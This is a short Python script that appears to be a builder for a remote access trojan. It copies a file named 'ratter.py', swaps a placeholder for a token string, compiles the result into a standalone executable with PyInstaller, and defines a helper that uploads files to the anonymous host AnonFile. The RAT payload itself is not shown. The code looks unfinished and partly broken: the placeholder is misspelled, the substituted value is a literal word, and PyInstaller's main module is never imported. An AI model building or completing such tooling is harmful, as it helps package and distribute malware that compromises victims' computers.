from anonfile import AnonFile
import shutil
from pathlib2 import Path
import PyInstaller
import os

def upload(filepath):
    file_up = AnonFile()
    up = file_up.upload(filepath)
    print(up.url.geturl())
#TODO  try running this on a vm to fix the OSerror to try debug
def create_executable(py_file):
    py_file = os.path.abspath(py_file)
    output_dir = os.path.dirname(py_file)
    spec_file = os.path.join(output_dir, 'output.spec')
    PyInstaller.__main__.run([
        '--name=output',
        '--onefile',
        '--specpath={}'.format(output_dir),
        '--distpath={}'.format(output_dir),
        '--workpath={}'.format(output_dir),
        py_file,
    ])
    os.remove(spec_file)
src = r'ratter.py'
dest = 'hi.py'
path = shutil.copyfile(src,dest)
file = Path(r'hi.py')
data = file.read_text()
re = 'token'
sr = '#Enteer'
data = data.replace(sr,re)
file.write_text(data)
create_executable('hi.py')
